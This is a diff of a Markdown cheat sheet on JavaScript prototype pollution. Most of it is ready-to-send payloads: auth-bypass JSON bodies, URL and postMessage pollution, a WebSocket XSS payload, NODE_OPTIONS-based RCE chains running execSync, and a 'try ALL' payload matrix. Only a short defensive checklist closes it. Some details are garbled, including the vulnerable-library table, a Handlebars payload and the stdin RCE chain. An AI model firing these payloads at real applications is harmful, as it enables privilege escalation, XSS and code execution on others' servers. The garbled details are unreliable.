@@ -1,88 +1,111 @@
-# Prototype Pollution: Complete Reference
+# Prototype Pollution: 2026 Complete Reference
 
-## Detection
+## Core Mechanism
 
-### Common Polluted Properties
-```javascript
-// Server-side (Node.js)
-__proto__
-constructor.prototype
-__proto__.isAdmin
-constructor.prototype.isAdmin
+Prototype pollution injects properties into JavaScript's `Object.prototype`. All objects inherit from this root prototype — injected property propagates to every object in the runtime.
 
-// Payload patterns
+### Entry Points (Server-Side, Node.js)
+```json
+// JSON body parsing (Express body-parser, express.json())
 {"__proto__": {"isAdmin": true}}
-{"constructor": {"prototype": {"isAdmin": true}}}
-{"__proto__": {"shell": "node"}}
+
+// Query string parsing (qs library)
+?__proto__[isAdmin]=true
+
+// Cookie parsing
+// File upload metadata
+// GraphQL variables
+// WebSocket messages
 ```
 
-### Vulnerable Operations
+### Entry Points (Client-Side)
 ```javascript
-// Object.assign
-Object.assign({}, userInput)
+// URL fragment parsing
+https://target.com/#__proto__[polluted]=true
 
-// Lodash merge
-_.merge({}, userInput)
+// PostMessage
+window.postMessage({__proto__: {evil: true}}, '*')
 
-// jQuery extend
-$.extend(true, {}, userInput)
+// localStorage / sessionStorage parsed with JSON.parse
 
-// Express body parsers
-app.use(express.json())
-app.use(bodyParser.json())
-
-// Spread operator merge
-{...userInput}
+// WebSocket
+ws.send(JSON.stringify({__proto__: {innerHTML: '<img src=x onerror=alert(1)>'}}))
 ```
 
-### Detection Payloads
+## Server-Side RCE Chains
+
+### NODE_OPTIONS Injection (Most Reliable)
+```json
+{
+  "__proto__": {
+    "shell": "node",
+    "env": {
+      "NODE_OPTIONS": "--require /dev/stdin",
+      "EVIL": "console.log(require('child_process').execSync('id').toString())"
+    }
+  }
+}
+```
+Node.js reads `NODE_OPTIONS` for every spawned process. `--require` loads arbitrary code.
+
+### lodash merge RCE Chain
+```json
+// Step 1: Pollute via vulnerable merge
+POST /api/config
+{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cwd/evil.js"}}
+
+// Step 2: Trigger child_process.exec or spawn anywhere in app
+```
+Polluted `NODE_OPTIONS` affects all subsequently spawned Node processes.
+
+### Known Vulnerable Sinks
+
+| Library | Version | Payload | Impact |
+|---------|---------|---------|--------|
+| lodash.merge | <4.17.5 | `__proto__[polluted]=true` | RCE/auth bypass |
+| jQuery | <3.4.0 | `{__proto__:{isAdmin:true}}` | Auth bypass |
+| $.extend | <4.0 | `{__proto__:{isAdmin:true}}` | DOM XSS |
+| _.merge | Lodash | `{"__proto__":{"polluted":1}}` | RCE |
+| Handlebars | <4.7.7 | `{{__lookup__/template.root}}` | RCE |
+
+## AST Injection via Prototype Pollution
+
+Template engines that compile templates to AST at runtime are vulnerable:
+- **Handlebars**: `{{__lookup__/template.root}}` — reads polluted property from any object
+- Polluted properties inject content directly into compiled template or AST node evaluation
+
+## Detection Methodology
+
+### Client-Side
 ```javascript
-// Server crashes or shows different behavior
-{"__proto__": {"a": "b"}}
-
-// Check if prototype was modified
-console.log({}.a)  // "b" if vulnerable
-
-// DoS detection
-{"__proto__": {"toString": "polluted"}}
+// Check console on target page after triggering pollution
+Object.prototype.polluted === "yes"
+({}).polluted === "yes"
 ```
 
-## Exploitation
-
-### RCE (Node.js)
-```javascript
-// Pollute to bypass shell checks
-{"__proto__": {"shell": "node", "env": "production"}}
-
-// Pollute child_process options
-{"__proto__": {"NODE_OPTIONS": "--require /tmp/evil.js"}}
-
-// Debugger injection
-{"__proto__": {"NODE_DEBUG": "child_process"}}
+### Server-Side
+```json
+// Send payload, check response for reflected property
+{"__proto__": {"polluted": "yes"}}
+// Check if admin endpoint returns 200 instead of 403
+// Check response JSON for "polluted":"yes"
 ```
 
-### Auth Bypass
-```javascript
-// Pollute isAdmin to true
-// Server code: if (user.isAdmin)
-// After pollution: {}.isAdmin === true
-
-{"__proto__": {"isAdmin": true}}
-{"__proto__": {"role": "admin"}}
-{"__proto__": {"authenticated": true}}
+### Payload Matrix (try ALL)
+```json
+{"__proto__":{"polluted":"yes"}}
+{"__proto__":["polluted","yes"]}
+{"__proto__":{"__proto__":{"polluted":"yes"}}}
+{"constructor":{"prototype":{"polluted":"yes"}}}
+{"a":{"__proto__":{"polluted":"yes"}}}
+{"[__proto__]":{"polluted":"yes"}}
+{"__proto__.polluted":"yes"}
 ```
 
-### Denial of Service
-```javascript
-// Override built-in methods
-{"__proto__": {"toString": "bad"}}
-{"__proto__": {"hasOwnProperty": "bad"}}
-// Any code using these methods will crash
-```
-
-## CVSS Scoring
-| Scenario | CVSS | Criteria |
-|----------|------|---------|
-| Prototype pollution -> RCE | 9.8 | Network, Low, No auth, Full impact |
-| Prototype pollution -> auth bypass | 8.1 | Network, Low, No auth, All high |
-| Prototype pollution -> DoS | 7.5 | Network, Low, No auth, Availability high |
+## Defensive Checklist
+1. Use `Object.create(null)` for configuration objects (no prototype)
+2. Use `Object.freeze()` on config objects after creation
+3. Sanitize keys — reject `__proto__`, `prototype`, `constructor`
+4. Use `JSON.parse` with schema validation (not raw parse)
+5. Update lodash, jQuery, Handlebars to latest versions
+6. Use `--disallow-code-generation-from-strings` in Node.js
